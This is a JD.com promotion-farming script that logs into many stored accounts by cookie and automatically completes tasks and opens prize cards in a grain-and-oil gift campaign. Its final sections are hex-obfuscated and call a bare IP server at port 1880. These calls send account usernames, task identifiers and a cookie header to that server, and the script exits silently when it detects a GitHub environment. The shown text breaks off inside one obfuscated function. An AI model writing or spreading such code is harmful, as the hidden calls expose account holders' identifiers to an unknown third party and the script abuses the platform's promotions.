/*
集萌宝得粮油礼包
入口：[京东App领券频道]
20 6,10,14,18,20 * * * Sami_jd_ddqkj.js
============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
*/

const $ = new Env("Sami集萌宝得粮油礼包")
const Ver = '20220408';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
let helpno = "",UUID="",flag1=false,activitykey="",datastr="";
!(async () => {
    await $.wait(1000);
    await VerCheck("ddqkj",Ver);
    await $.wait(1000);
    UUID = getUUID();
    await $.wait(1000);
    requireConfig()
    await $.wait(1000);
    await instructions()
    await $.wait(2000);
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        console.log(`\n账号【${$.index}】${$.UserName} 开始任务******`);
        await getBodySign('Task','0',$.UserName1);
        //点点券-浏览任务 displayOrder=3
        await instructionsList();
        await grmhc(6);
        await $.wait(2000);
        //console.log(activitykey)
        for(ii=1; ii<5;ii++){
            //console.log(ii);
            await grmhc(ii);
            await $.wait(2000);
        }
        await grmhc(5);
        await $.wait(2000);
        
        await khb();
        await $.wait(2000);
       
    }
    
  
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })


//点点券
async function instructions(){
    try{
        let data = await GetAllTask("necklacecard_cardHomePage","","body=%7B%22channel%22%3A%221%22%7D");
        console.log(data.data?.result?.activityName)
        activitykey = data.data?.result?.activityKey
    }catch(e){
        
    }
}
//点点券
async function instructionsList(){
    try{
        let data = await GetAllTask("necklacecard_cardHomePage","","body=%7B%22channel%22%3A%221%22%7D");
        for (let vo of data.data?.result?.cards){
            if(vo.isOpen==0){
                console.log('👀萌卡:'+vo.cardName+' 开卡状态:未开')
            }else{
                console.log('😊萌卡:'+vo.cardName+' 开卡状态:已开')
            }
            await $.wait(200)
        }
    }catch(e){
        
    }
}

//开红包
async function khb(){
    try{
        let flag=false;
        for(let i=0;i<50;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklacecard_cardHomePage","","body=%7B%22channel%22%3A%221%22%7D");
            //console.log(JSON.stringify(data))
            if (data.data?.result?.drawCardStatus==2){
                await getBodySign('necklacecard_openCard',$.UserName1,activitykey,'','',''); 
                       //console.log(helpno)
                data1 = await startTask('necklacecard_openCard','');
                if(data1.data?.result?.cardName==""){
                    console.log("🧧🧧🧧"+"无名萌卡"+"->"+data1.data?.biz_msg+"✔✔✔")
                }else{
                    console.log("🧧🧧🧧"+data1.data?.result?.cardName+"->"+data1.data?.biz_msg+"✔✔✔")
                }
                
                //console.log(JSON.stringify(data1))
            }else{
                 console.log("🧧🧧🧧本轮抽奖已经完成✔✔✔")
                 flag=true;
            }
        }
        
    }catch(e){
        
    }
    
}

//taskType=3
async function grmhc(taskType){
    try{
        let flag=false;
        let encryptTaskId ="";
        for(let i=0;i<15;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklacecard_taskList","","body=%7B%22activityKey%22%3A%22"+activitykey+"%22%7D");
            //console.log(JSON.stringify(data))
            //console.log(data.data?.result?.componentTaskPid)
            for (let vo of data.data?.result?.componentTaskInfo){
                //console.log(vo.encryptTaskId+'->'+vo.groupItemCount+'->'+vo.completedItemCount+'->'+vo.taskStatus+'->'+vo.taskType);
                if(vo.taskType===taskType){
                    if(vo.taskStatus===1 || vo.taskStatus===2){
                    //function getBodySign(functionId,UserName,activityKey,encryptTaskId,encryptProjectId,itemId)
                       await getBodySign('necklacecard_taskReport',$.UserName1,activitykey,vo.encryptTaskId,data.data?.result?.componentTaskPid,vo.itemId); 
                       //console.log(helpno)
                       data1 = await startTask('necklacecard_taskReport','');
                       if(data1.data?.biz_msg=='活动太火爆了，还是去买买买吧~'){
                           flag=true
                       }else{
                           if (taskType == 1 || taskType == 5 ){
                               console.log("📮"+vo.taskTitle+"->"+data1.data?.biz_msg+"✔✔✔")
                           }else{
                               console.log("📮"+vo.name+"->"+data1.data?.biz_msg+"✔✔✔")
                           }
                           if(encryptTaskId == vo.encryptTaskId && taskType==5 ){
                               if( vo.taskTitle == undefined){
                                   console.log("【警告】"+vo.name+"->请手工加入会员再执行✔✔✔")
                               }else{
                                   console.log("【警告】"+vo.taskTitle+"->请手工加入会员再执行✔✔✔")
                               }                   
                               flag=true                    
                           }else if(taskType == 5){
                               encryptTaskId = vo.encryptTaskId;
                           }
                       }  
                    }
                    if(vo.taskStatus===3){
                        if (taskType == 1 || taskType == 5 ){
                            console.log("🥇"+vo.taskTitle+"->任务已经完成啦✔✔✔")
                        }else{
                            console.log("🥇"+vo.name+"->任务已经完成啦✔✔✔")
                        }
                        flag=true
                    }
                    
                }
            }
        }
        
    }catch(e){
        
    }
    
}


//点点券代码
function getUUID(x = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", t = 0) { return x.replace(/[xy]/g, function (x) { var r = 16 * Math.random() | 0, n = "x" == x ? r : 3 & r | 8; return uuid = t ? n.toString(36).toUpperCase() : n.toString(36), uuid }) }
//点点券代码
function GetAllTask(functionId,url1,body={}) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/api?appid=coupon-necklace&functionId=${functionId}&client=wh5&t=${Date.now()}${url1}`,
            body: body,
            headers: {
                "authority": "api.m.jd.com",
                "origin": "https://h5.m.jd.com",
                "accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`);
                    console.log(`${$.name} API请求失败，请检查网路重试`);
                } else {
                    if (data) {
                        data = JSON.parse(data);
                    } else {
                        console.log(`服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e)
            } finally {
                resolve(data);
            }
        })
    })
}


function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd754=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x3F\x61\x70\x70\x69\x64\x3D\x63\x6F\x75\x70\x6F\x6E\x2D\x6E\x65\x63\x6B\x6C\x61\x63\x65\x26\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x63\x6C\x69\x65\x6E\x74\x3D\x77\x68\x35\x26\x74\x3D","\x6E\x6F\x77","","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x69\x73\x4E\x6F\x64\x65","\x4A\x44\x5F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x65\x6E\x76","\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x2E\x2F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54\x53","\x4A\x44\x55\x41","\x67\x65\x74\x64\x61\x74\x61","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x39\x2E\x34\x2E\x34\x3B\x31\x34\x2E\x33\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x34\x67\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x34\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x61\x72\x73\x65","\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function startTask(_0x971dx2,_0x971dx3){return  new Promise(async (_0x971dx4)=>{const _0x971dx5={url:`${__Oxdd754[0x0]}${_0x971dx2}${__Oxdd754[0x1]}${Date[__Oxdd754[0x2]]()}${__Oxdd754[0x3]}${_0x971dx3}${__Oxdd754[0x3]}`,body:helpno,headers:{"\x61\x75\x74\x68\x6F\x72\x69\x74\x79":__Oxdd754[0x4],"\x6F\x72\x69\x67\x69\x6E":__Oxdd754[0x5],"\x61\x63\x63\x65\x70\x74":__Oxdd754[0x6],"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":__Oxdd754[0x7],"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":$[__Oxdd754[0x8]]()?(process[__Oxdd754[0xa]][__Oxdd754[0x9]]?process[__Oxdd754[0xa]][__Oxdd754[0x9]]:(require(__Oxdd754[0xc])[__Oxdd754[0xb]])):($[__Oxdd754[0xe]](__Oxdd754[0xd])?$[__Oxdd754[0xe]](__Oxdd754[0xd]):__Oxdd754[0xf])}};$[__Oxdd754[0x17]](_0x971dx5,(_0x971dx6,_0x971dx7,_0x971dx8)=>{try{if(_0x971dx6){console[__Oxdd754[0x11]](`${__Oxdd754[0x3]}${JSON[__Oxdd754[0x10]](_0x971dx6)}${__Oxdd754[0x3]}`);console[__Oxdd754[0x11]](`${__Oxdd754[0x3]}${$[__Oxdd754[0x12]]}${__Oxdd754[0x13]}`)}else {if(_0x971dx8){_0x971dx8= JSON[__Oxdd754[0x14]](_0x971dx8)}else {console[__Oxdd754[0x11]](`${__Oxdd754[0x15]}`)}}}catch(e){$[__Oxdd754[0x16]](e)}finally{_0x971dx4(_0x971dx8)}})})}(function(_0x971dx9,_0x971dxa,_0x971dxb,_0x971dxc,_0x971dxd,_0x971dxe){_0x971dxe= __Oxdd754[0x18];_0x971dxc= function(_0x971dxf){if( typeof alert!== _0x971dxe){alert(_0x971dxf)};if( typeof console!== _0x971dxe){console[__Oxdd754[0x11]](_0x971dxf)}};_0x971dxb= function(_0x971dx10,_0x971dx9){return _0x971dx10+ _0x971dx9};_0x971dxd= _0x971dxb(__Oxdd754[0x19],_0x971dxb(_0x971dxb(__Oxdd754[0x1a],__Oxdd754[0x1b]),__Oxdd754[0x1c]));try{_0x971dx9= __encode;if(!( typeof _0x971dx9!== _0x971dxe&& _0x971dx9=== _0x971dxb(__Oxdd754[0x1d],__Oxdd754[0x1e]))){_0x971dxc(_0x971dxd)}}catch(e){_0x971dxc(_0x971dxd)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd755=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x64\x64\x71\x6B\x6A\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x4B\x65\x79\x3D","\x26\x65\x6E\x63\x72\x79\x70\x74\x54\x61\x73\x6B\x49\x64\x3D","\x26\x65\x6E\x63\x72\x79\x70\x74\x50\x72\x6F\x6A\x65\x63\x74\x49\x64\x3D","\x26\x69\x74\x65\x6D\x49\x64\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x64\x61\x74\x61\x31","\x64\x61\x74\x61\x32","\x64\x61\x74\x61\x33","\x64\x61\x74\x61\x34","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function 